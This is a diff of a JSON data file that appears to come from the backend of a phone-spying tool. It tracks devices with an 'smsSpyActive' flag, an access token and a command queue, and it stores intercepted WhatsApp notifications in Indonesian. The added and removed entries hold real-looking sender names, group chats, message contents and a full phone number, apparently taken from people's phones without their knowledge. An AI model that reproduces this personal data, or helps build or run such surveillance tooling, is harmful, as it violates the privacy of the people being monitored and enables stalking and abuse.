@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776922205467,
+    "lastSeen": 1776922211461,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎68 pesan dari 41 chat",
+        "time": "23/04 13:30",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922207819
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "23/04 13:30",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922207801
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "23/04 09:45",
         "pkg": "com.whatsapp",
         "receivedAt": 1776908708940
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Nakan",
-        "content": "yaudah nanti aja, aku mau makan dulu",
-        "time": "23/04 09:45",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776908708928
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 821-4849-9859",
-        "content": "KLO sdh selsai bantu peembersihan kantin ya",
-        "time": "23/04 09:45",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776908708880
       }
     ],
     "galleryPhotos": [],
@@ -9971,6 +9971,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎200 pesan dari 4 chat",
+        "time": "23/04 13:30",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922207654
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (9 pesan): ~ Tinieq",
+        "content": "Adaji ft ku di situ fitrah",
+        "time": "23/04 13:30",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776922207638
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎Senam Rappocini (8 pesan): ~ ST.AISYAH.S",
         "content": "Mantap cpii",
         "time": "23/04 13:29",
@@ -13952,22 +13968,6 @@
         "time": "22/04 17:17",
         "pkg": "com.whatsapp",
         "receivedAt": 1776849422783
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎191 pesan dari 4 chat",
-        "time": "22/04 17:17",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776849420304
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Podang",
-        "content": "Ih dia mau pakai saya nasuruh bayar",
-        "time": "22/04 17:17",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776849420273
       }
     ],
     "galleryPhotos": [],
